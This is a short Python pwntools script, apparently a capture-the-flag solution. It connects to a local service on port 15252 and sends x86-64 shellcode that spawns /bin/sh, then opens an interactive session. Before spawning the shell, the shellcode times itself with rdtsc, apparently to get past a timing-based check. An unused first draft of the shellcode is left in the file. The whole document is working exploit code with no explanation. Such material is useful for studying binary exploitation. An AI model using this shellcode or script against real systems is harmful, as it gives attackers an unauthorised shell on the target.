from pwn import *
context.arch='amd64'

p = remote('localhost', 15252)

gogo = shellcraft.sh()

shellcode = f'''
rdtsc
mov rdi, rax
mov rsi, rdx
nop
rdtsc
sub rax, rdi
push rax
mov rdi, 1
mov rsi, rsp
mov rdx, 8
mov rax, 1
syscall
pop rax
jmp exit
gogo:
xor eax, eax
push rax
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
xor esi, esi
xor edx, edx
mov al, 0x3b
syscall
exit:
ret
'''

shellcode = f'''

rdtsc
mov rdi, rax
mov rsi, rdx
nop
rdtsc
sub rax, rdi
cmp rax, 0x8500
jl gogo
jmp exit
gogo:
    xor eax, eax;
    push rax;
    mov rdi, 0x68732f6e69622f;
    push rdi;
    mov rdi, rsp;
    xor esi, esi;
    xor edx, edx;
    mov al, 0x3b;
    syscall;
exit:
    ret;
'''
payload = asm(shellcode)

p.sendlineafter(b"> ", payload)

p.interactive()

